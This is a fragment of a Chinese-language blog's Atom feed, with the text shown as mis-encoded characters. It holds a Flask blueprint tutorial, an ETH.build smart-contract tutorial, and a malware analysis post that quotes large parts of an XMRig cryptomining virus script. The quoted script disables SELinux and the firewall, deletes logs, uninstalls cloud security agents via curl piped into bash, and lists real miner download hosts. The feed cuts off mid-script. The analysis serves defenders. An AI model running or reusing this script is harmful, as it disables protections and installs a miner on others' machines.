    <content type="html"><![CDATA[<p>æ–°å»ºä¸€ä¸ª<code>test1.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> test2 <span class="keyword">import</span> lantu2</span><br><span class="line"></span><br><span class="line">test1 = Flask(__name__)</span><br><span class="line">test1.register_blueprint(lantu2)</span><br><span class="line"></span><br><span class="line">test1.run(port=<span class="number">5001</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>å†å»ºä¸€ä¸ª<code>test2.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint</span><br><span class="line">lantu2 = Blueprint(<span class="string">&quot;dsfsdfasdfadfasdf&quot;</span>,__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@lantu2.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lantu</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;xiaoyue&quot;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨è“å›¾å°±æ˜¯åŸæ¥app.pyå¤šäº†ä¸¤è¡Œä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from éšä¾¿ä¸€ä¸ªé¡µé¢ import è“å›¾</span><br><span class="line">app.register_blueprint(è“å›¾)</span><br></pre></td></tr></table></figure><p>è€Œåè“å›¾ä¸­åªè¦å¯¼å…¥Blueprintå°±å’Œæ™®é€šapp.pyä¸€æ ·å†™è·¯ç”±åŠ åŠŸèƒ½å°±è¡Œäº†ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æ–°å»ºä¸€ä¸ª&lt;code&gt;test1.py&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span cl</summary>
      
    
    
    
    <category term="Python" scheme="https://x1a0.net/categories/Python/"/>
    
    <category term="Flask" scheme="https://x1a0.net/categories/Flask/"/>
    
    
    <category term="Python" scheme="https://x1a0.net/tags/Python/"/>
    
    <category term="flask" scheme="https://x1a0.net/tags/flask/"/>
    
    <category term="è“å›¾" scheme="https://x1a0.net/tags/%E8%93%9D%E5%9B%BE/"/>
    
  </entry>
  
  <entry>
    <title>ETHbuild-é›¶ä»£ç å…¥é—¨åˆçº¦å¼€å‘</title>
    <link href="https://x1a0.net/2021/11/15/ETHbuild-%E9%9B%B6%E4%BB%A3%E7%A0%81%E5%85%A5%E9%97%A8%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/"/>
    <id>https://x1a0.net/2021/11/15/ETHbuild-%E9%9B%B6%E4%BB%A3%E7%A0%81%E5%85%A5%E9%97%A8%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/</id>
    <published>2021-11-15T12:05:45.000Z</published>
    <updated>2021-11-15T13:22:37.210Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ç¥å¥‡çš„sandbox-eth-build"><a href="#ç¥å¥‡çš„sandbox-eth-build" class="headerlink" title="ç¥å¥‡çš„sandbox.eth.build"></a>ç¥å¥‡çš„sandbox.eth.build</h2><p>ä¸€ä¸ªæ —å­ğŸŒ°:<br><a href="https://eth.build/build#9279763e02828519b2edf8bdcd035d0961bcea07ed803fb13e3cfd178db9cc2c">ã€ŒETHbuildã€</a></p><h2 id="ä½¿ç”¨ganache-cliåˆ›å»ºæµ‹è¯•é“¾"><a href="#ä½¿ç”¨ganache-cliåˆ›å»ºæµ‹è¯•é“¾" class="headerlink" title="ä½¿ç”¨ganache-cliåˆ›å»ºæµ‹è¯•é“¾"></a>ä½¿ç”¨ganache-cliåˆ›å»ºæµ‹è¯•é“¾</h2><p>å¦‚æœä½ æœ‰é’±æˆ–è€…æœ‰è¶³å¤Ÿçš„æ—¶é—´å»è·Ÿæ°´é¾™å¤´è¦æµ‹è¯•å¸ï¼Œå½“ç„¶ï¼Œä½ å¯ä»¥è·³è¿‡è¿™ä¸ªæ­¥éª¤ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ganache-cli</span><br></pre></td></tr></table></figure><p>æ‰“å¼€ååº”è¯¥åƒè¿™æ ·ï¼š</p><p><img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.13.19.png"></p><p>å¦‚æœä½ æ²¡æœ‰ganacheï¼Œé‚£ä¹ˆä½ å¯èƒ½éœ€è¦ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cnpm -g install ganache-cli</span><br><span class="line"><span class="comment">#or</span></span><br><span class="line">npm -g install ganache-cli</span><br></pre></td></tr></table></figure><h2 id="æ›´æ”¹ğŸŒ°ä¸­çš„chainæ¨¡å—"><a href="#æ›´æ”¹ğŸŒ°ä¸­çš„chainæ¨¡å—" class="headerlink" title="æ›´æ”¹ğŸŒ°ä¸­çš„chainæ¨¡å—"></a>æ›´æ”¹ğŸŒ°ä¸­çš„chainæ¨¡å—</h2><ul><li><p>ç¬¬ä¸€ä¸ªchainæ¨¡å—åœ¨ä¸»é¡µï¼Œè¿æ¥ç€contractçš„blockchainã€‚  <img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.21.40.png"></p></li><li><p>ç¬¬äºŒä¸ªchainåœ¨walletä¸‹ (<strong>åŒå‡»walletè¿›å…¥è¯¥æ¨¡å—</strong>) ï¼Œä¹Ÿå¯ä»¥è¿æ¥inputè¿‡æ¥çš„chainã€‚æˆ‘åœ¨è¿™é‡Œæµ‹è¯•æ˜¯å¦è¿æ¥é“¾æˆåŠŸã€‚ï¼ˆå³è¾¹ä¼šæ˜¾ç¤ºä½™é¢ï¼‰<img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.27.30.png"></p></li></ul><h2 id="å¡«å…¥ç§é’¥ï¼Œåšä¸€ä¸ªæ‹¥æœ‰100ETHçš„å¯Œè±ªå§ï¼"><a href="#å¡«å…¥ç§é’¥ï¼Œåšä¸€ä¸ªæ‹¥æœ‰100ETHçš„å¯Œè±ªå§ï¼" class="headerlink" title="å¡«å…¥ç§é’¥ï¼Œåšä¸€ä¸ªæ‹¥æœ‰100ETHçš„å¯Œè±ªå§ï¼"></a>å¡«å…¥ç§é’¥ï¼Œåšä¸€ä¸ªæ‹¥æœ‰100ETHçš„å¯Œè±ªå§ï¼</h2><ul><li><p>å¯åŠ¨å¥½ganacheæˆ‘ä»¬ä¼šæ‹¥æœ‰10ä¸ªåœ°å€ï¼Œæ¯ä¸ªåœ°å€æ‹¥æœ‰100ä¸ªETHã€‚ç°åœ¨éšæœºé€‰å–ä¸€ä¸ªç§é’¥å¡«å…¥walletä¸‹çš„private key inputç«¯å£ã€‚<img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.33.45.png"></p></li><li><p>åŒæ ·åœ¨walletæ¨¡å—ä¸‹å°±èƒ½æŸ¥çœ‹åˆ°ä½™é¢äº†!wowï¼Œ473288$!<img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.35.43.png"></p></li></ul><h2 id="éƒ¨ç½²åˆçº¦"><a href="#éƒ¨ç½²åˆçº¦" class="headerlink" title="éƒ¨ç½²åˆçº¦"></a>éƒ¨ç½²åˆçº¦</h2><ul><li><p>æŒ‰escè¿”å›åˆ°ä¸»é¡µé¢ï¼Œç‚¹å‡»deployï¼Œä½ åº”è¯¥ä¼šå‘ç°addresså‘ç”Ÿäº†æ”¹å˜ï¼Œå› ä¸ºæˆ‘ä»¬éƒ¨ç½²äº†ä¸€ä¸ªæ–°åˆçº¦ã€‚<img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.38.30.png"></p></li><li><p>æŸ¥çœ‹å½“å‰è®¾ç½®çš„nameå’Œownerï¼Œä½ ä¼šå‘ç°name = xiaoyue,owner = 0x000000Â·Â·Â·ã€‚ä¸è¿‡æ²¡å…³ç³»ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥æ›´æ”¹ä»–ä»¬ã€‚</p></li></ul><h2 id="è®¾ç½®æˆ‘ä»¬è‡ªå·±çš„åå­—å’Œåœ°å€ï¼"><a href="#è®¾ç½®æˆ‘ä»¬è‡ªå·±çš„åå­—å’Œåœ°å€ï¼" class="headerlink" title="è®¾ç½®æˆ‘ä»¬è‡ªå·±çš„åå­—å’Œåœ°å€ï¼"></a>è®¾ç½®æˆ‘ä»¬è‡ªå·±çš„åå­—å’Œåœ°å€ï¼</h2><ul><li><p>åœ¨textä¸­å¡«å…¥æˆ‘ä»¬è‡ªå·±çš„åå­—ï¼Œæ¯”å¦‚æˆ‘çš„å¦ä¸€ä¸ªåå­—balalaã€‚ç‚¹å‡»æ—è¾¹çš„click meä¹‹åä¼šå‘ç°transactionçš„outputç«¯å£å·²ç»å°†æˆ‘ä»¬çš„äº¤æ˜“ä¿¡æ¯æ‰“å‡ºæ¥äº†ï¼Œè¿™é¢„ç¤ºç€æˆ‘ä»¬å¯èƒ½æ›´åæˆåŠŸ<img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.45.14.png"></p></li><li><p>è€Œåœ¨æ—è¾¹æˆ‘ä»¬è°ƒç”¨set_ownerå‡½æ•°ï¼Œå¹¶å‘ä»–è½¬äº†0ä¸ªethã€‚è¿™æ—¶åˆçº¦ä¼šè®°å½•æˆ‘ä»¬çš„åœ°å€ï¼Œå¹¶è‡ªåŠ¨è®¾ç½®åˆ°ownerå˜é‡ä¸­ã€‚<img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.50.28.png"></p></li></ul><h2 id="æŸ¥çœ‹æˆ‘ä»¬æ›´æ”¹åçš„name-and-owner"><a href="#æŸ¥çœ‹æˆ‘ä»¬æ›´æ”¹åçš„name-and-owner" class="headerlink" title="æŸ¥çœ‹æˆ‘ä»¬æ›´æ”¹åçš„name and owner"></a>æŸ¥çœ‹æˆ‘ä»¬æ›´æ”¹åçš„name and owner</h2><p>æ˜¾ç„¶ï¼Œæ›´æ”¹æˆåŠŸäº†~âœ¿âœ¿ãƒ½(Â°â–½Â°)ãƒâœ¿</p><p><img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.53.00.png"></p><h2 id="ä¸¤ä¸ªå°tips"><a href="#ä¸¤ä¸ªå°tips" class="headerlink" title="ä¸¤ä¸ªå°tips"></a>ä¸¤ä¸ªå°tips</h2><ol><li><p>åœ¨é‡æ–°æ‰“å¼€åˆ«äººçš„é¡¹ç›®æˆ–è€…è‡ªå·±ç»™é¡¹ç›®æ·»åŠ titleåï¼Œmoduleä¸­çš„è¿æ¥çº¿ä¼šæ–­å¼€ï¼å¦‚æœä½ å‘ç°è¿™ä¸ªğŸŒ°è¿è¡Œä¸èµ·æ¥ï¼Œä¸å¦¨æ‰“å¼€walletå’Œdeployæ¨¡å—æŸ¥çœ‹inputçš„è¿æ¥çº¿æ˜¯å¦æ–­å¼€ã€‚</p></li><li><p>é¼ æ ‡å•æœºä¸€ä¸ªç©ºç™½åœ°æ–¹ï¼ŒæŒ‰ç©ºæ ¼å°±èƒ½å¿«é€Ÿæ‰¾åˆ°ä½ è¦çš„æ¨¡å—äº†ï¼</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ç¥å¥‡çš„sandbox-eth-build&quot;&gt;&lt;a href=&quot;#ç¥å¥‡çš„sandbox-eth-build&quot; class=&quot;headerlink&quot; title=&quot;ç¥å¥‡çš„sandbox.eth.build&quot;&gt;&lt;/a&gt;ç¥å¥‡çš„sandbox.eth.build&lt;/h2&gt;&lt;</summary>
      
    
    
    
    <category term="åŒºå—é“¾" scheme="https://x1a0.net/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Solidity" scheme="https://x1a0.net/categories/Solidity/"/>
    
    
    <category term="åŒºå—é“¾" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="solidity" scheme="https://x1a0.net/tags/solidity/"/>
    
    <category term="ethbuild" scheme="https://x1a0.net/tags/ethbuild/"/>
    
  </entry>
  
  <entry>
    <title>xmræŒ–çŸ¿è„šæœ¬åˆ†æ</title>
    <link href="https://x1a0.net/2021/11/10/xmr%E6%8C%96%E7%9F%BF%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>https://x1a0.net/2021/11/10/xmr%E6%8C%96%E7%9F%BF%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/</id>
    <published>2021-11-10T07:23:35.000Z</published>
    <updated>2021-11-10T07:30:15.967Z</updated>
    
    <content type="html"><![CDATA[<h1 id="é—¨ç½—å¸xmrigæŒ–çŸ¿ç—…æ¯’åˆ†æ"><a href="#é—¨ç½—å¸xmrigæŒ–çŸ¿ç—…æ¯’åˆ†æ" class="headerlink" title="é—¨ç½—å¸xmrigæŒ–çŸ¿ç—…æ¯’åˆ†æ"></a>é—¨ç½—å¸xmrigæŒ–çŸ¿ç—…æ¯’åˆ†æ</h1><p>èµ·å› æ˜¯é˜Ÿé‡Œè€å¸ˆçš„æœåŠ¡å™¨ä¸­æ‹›äº†ï¼Œä¸è¿‡æ˜¯åœ¨dockeré‡Œé¢ï¼Œé˜¿é‡Œäº‘ç›¾çš„è¯¯æŠ¥ã€‚æƒé™ç»™çš„å°ï¼Œå°±æ²¡å»å¤„ç†ã€‚è¿™é‡Œåˆ†æä¸‹è¿™ä¸ªè„šæœ¬çš„é€»è¾‘ã€‚å¸Œæœ›å¤§å®¶å†æ¬¡ä¸­æ‹›çš„æ—¶å€™ä¸ä¼šè¿™ä¹ˆæ‡µã€‚</p><p>è¿™ä¸ªæŒ–çŸ¿è„šæœ¬æ˜æ˜¾æ˜¯é€šè¿‡ä¹‹å‰çš„å‡ ä¸ªç‰ˆæœ¬çš„ç—…æ¯’é­”æ”¹çš„ï¼Œè¿˜æ˜¯Redisæœªæˆæƒæ¼æ´ã€‚ç—…æ¯’ä¼šé€šè¿‡æ„ŸæŸ“ä¸»æœºè®¾ç½®äº†å…å¯†ç™»å½•çš„å…¶ä»–ä¸»æœºï¼Œå¹¶è¿›è¡ŒRedisæ•°æ®åº“æœªæˆæƒè®¿é—®æ¼æ´çš„æ‰«æã€‚</p><p>å› ä¸ºæœ€è¿‘æ¯”èµ›å¾ˆå¤šï¼Œæœ‰ç©ºå†å†™å¤„ç½®æ–¹æ³•ã€‚å“ˆå“ˆï¼Œé¸½é¸½ã€‚</p><hr><p>è·å–å½“å‰ipåœ°å€ä¿¡æ¯<br>sedå…¨å±€æ›¿æ¢(/g)å°†â€,â€æ›¿æ¢ä¸ºâ€\nâ€<br>grepä¸åŒºåˆ†å¤§å°å†™åˆ¤æ–­æ˜¯å¦å«æœ‰CN</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> curl http://ip-api.com/json/ | sed <span class="string">&#x27;s/,/\n/g&#x27;</span> | grep  -i <span class="string">&#x27;CN&#x27;</span>; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">exit</span> 1 </span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Linuxä¸‹çš„å®‰å…¨å­ç³»ç»Ÿå…³é—­ï¼Œå¹¶ä¸”å°†é”™è¯¯è¾“å‡ºåˆ°é»‘æ´</p><p><a href="https://baike.baidu.com/item/SELinux/8865268?fr=aladdin">Selinux</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setenforce 0 2&gt;dev/null</span><br><span class="line"><span class="built_in">echo</span> SELINUX=disabled &gt; /etc/sysconfig/selinux 2&gt;/dev/null</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¸…ç†ç¼“å­˜</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sync &amp;&amp; <span class="built_in">echo</span> 3 &gt;/proc/sys/vm/dro</span><br></pre></td></tr></table></figure><p>æ›´æ”¹äº†ä¸€äº›ç³»ç»Ÿå‘½ä»¤åç§°ï¼Œå®šä¹‰äº†ä¸€äº›å˜é‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">crondir=<span class="string">&#x27;/var/spool/cron/&#x27;</span><span class="string">&quot;<span class="variable">$USER</span>&quot;</span></span><br><span class="line">cont=`cat <span class="variable">$&#123;crondir&#125;</span>`</span><br><span class="line">ssht=`cat /root/.ssh/authorized_keys`</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /etc/zzhs</span><br><span class="line">rtdir=<span class="string">&quot;/etc/zzhs&quot;</span></span><br><span class="line">bbdir=<span class="string">&quot;/usr/bin/curl&quot;</span></span><br><span class="line">bbdira=<span class="string">&quot;/usr/bin/cd1&quot;</span></span><br><span class="line">ccdir=<span class="string">&quot;/usr/bin/wget&quot;</span></span><br><span class="line">ccdira=<span class="string">&quot;/usr/bin/wd1&quot;</span></span><br><span class="line">mv /usr/bin/curl /usr/bin/url</span><br><span class="line">mv /usr/bin/url /usr/bin/cd1</span><br><span class="line">mv /usr/bin/wget /usr/bin/get</span><br><span class="line">mv /usr/bin/get /usr/bin/wd1</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹æœ€å¤§æ–‡ä»¶é™åˆ¶æ•°</p><p>åˆ é™¤æ—¥å¿—æ–‡ä»¶</p><p>ç»™ç›®å½•ä¸Šé”</p><p>å…³é—­é˜²ç«å¢™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ulimit</span> -n 65535</span><br><span class="line">rm -rf /var/<span class="built_in">log</span>/syslog</span><br><span class="line">chattr -iua /tmp/</span><br><span class="line">chattr -iua /var/tmp/</span><br><span class="line">ufw <span class="built_in">disable</span></span><br><span class="line">iptables -F</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…³é—­ç³»ç»Ÿç›‘è§†</p><p>åˆ æ‰äº†ä¸¤ä¸ªè´¦æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sudo sysctl kernel.nmi_watchdog=0</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;0&#x27;</span> &gt;/proc/sys/kernel/nmi_watchdog</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;kernel.nmi_watchdog=0&#x27;</span> &gt;&gt;/etc/sysctl.conf</span><br><span class="line">userdel akay</span><br><span class="line">userdel vfinder</span><br><span class="line">rm -rf /tmp/addres*</span><br><span class="line">rm -rf /tmp/walle*</span><br><span class="line">rm -rf /tmp/keys</span><br></pre></td></tr></table></figure><p>å¸è½½é˜¿é‡Œäº‘ç›¾å’Œè…¾è®¯çš„äº‘é•œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ps aux | grep -i <span class="string">&#x27;[a]liyun&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">  <span class="variable">$bbdir</span> http://update.aegis.aliyun.com/download/uninstall.sh | bash</span><br><span class="line">  <span class="variable">$bbdir</span> http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash</span><br><span class="line">  <span class="variable">$bbdira</span> http://update.aegis.aliyun.com/download/uninstall.sh | bash</span><br><span class="line">  <span class="variable">$bbdira</span> http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash</span><br><span class="line">  pkill aliyun-service</span><br><span class="line">  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service</span><br><span class="line">  rm -rf /usr/<span class="built_in">local</span>/aegis*</span><br><span class="line">  systemctl stop aliyun.service</span><br><span class="line">  systemctl <span class="built_in">disable</span> aliyun.service</span><br><span class="line">  service bcm-agent stop</span><br><span class="line">  yum remove bcm-agent -y</span><br><span class="line">  apt-get remove bcm-agent -y</span><br><span class="line"><span class="keyword">elif</span> ps aux | grep -i <span class="string">&#x27;[y]unjing&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">  /usr/<span class="built_in">local</span>/qcloud/stargate/admin/uninstall.sh</span><br><span class="line">  /usr/<span class="built_in">local</span>/qcloud/YunJing/uninst.sh</span><br><span class="line">  /usr/<span class="built_in">local</span>/qcloud/monitor/barad/admin/uninstall.sh</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>å®šä¹‰è¿œç¨‹æ–‡ä»¶åœ°å€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">miner_url=<span class="string">&quot;http://106.15.74.113/b2f628/zzh&quot;</span></span><br><span class="line">miner_url_backup=<span class="string">&quot;http://104.244.76.33/b2f628/zzh&quot;</span></span><br><span class="line">miner_size=<span class="string">&quot;7600464&quot;</span></span><br><span class="line">sh_url=<span class="string">&quot;https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexni.png&quot;</span></span><br><span class="line">sh_url_backup=<span class="string">&quot;https://guli-edut.oss-cn-shanghai.aliyuncs.com/2020/06/04/indexni.png&quot;</span></span><br><span class="line">config_url=<span class="string">&quot;http://106.15.74.113/b2f628/config.json&quot;</span></span><br><span class="line">config_url_backup=<span class="string">&quot;http://104.244.76.33/b2f628/config.json&quot;</span></span><br><span class="line">config_size=<span class="string">&quot;2752&quot;</span></span><br><span class="line">chattr_size=<span class="string">&quot;8000&quot;</span></span><br><span class="line">rm -f /tmp/.null 2&gt;/dev/null</span><br><span class="line"><span class="built_in">echo</span> 128 &gt; /proc/sys/vm/nr_hugepages</span><br><span class="line">sysctl -w vm.nr_hugepages=128</span><br></pre></td></tr></table></figure><p>åˆ é™¤åŒç±»æŒ–çŸ¿ç—…æ¯’ï¼Œå¾ˆé•¿ï¼Œçœç•¥äº†äº›ã€‚</p><p>éœ€è¦ç—…æ¯’æ ·æœ¬ç ”ç©¶çš„å¯ä»¥ä»è¿™æ‹¿ï¼š<a href="https://github.com/xiaoyue2019/Xmrig-mining-virus-samples">https://github.com/xiaoyue2019/Xmrig-mining-virus-samples</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="title">kill_miner_proc</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">netstat -anp | grep 185.71.65.238 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep 140.82.52.87 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :443 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :23 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :443 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :143 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :2222 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :3333 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :3389 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :5555 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span 